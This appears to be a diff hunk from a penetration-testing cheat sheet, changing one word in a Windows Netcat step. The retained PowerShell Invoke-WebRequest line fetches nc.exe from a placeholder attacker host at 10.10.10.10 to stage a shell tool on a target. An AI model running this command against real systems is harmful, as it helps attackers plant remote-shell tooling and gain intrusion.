@@ -122,7 +122,7 @@ xterm -display [IP]:1
 ## Windows
 **Netcat**
 
-Download nc (e.g. hosted via `python -m SimpleHTTPServer 80` within /usr/share/windows-binaries)
+Upload nc (e.g. hosted via `python -m SimpleHTTPServer 80` within /usr/share/windows-binaries)
 ```powershell
 powershell Invoke-WebRequest -Uri 'http://10.10.10.10/nc.exe' -OutFile 'nc.exe'
 ```
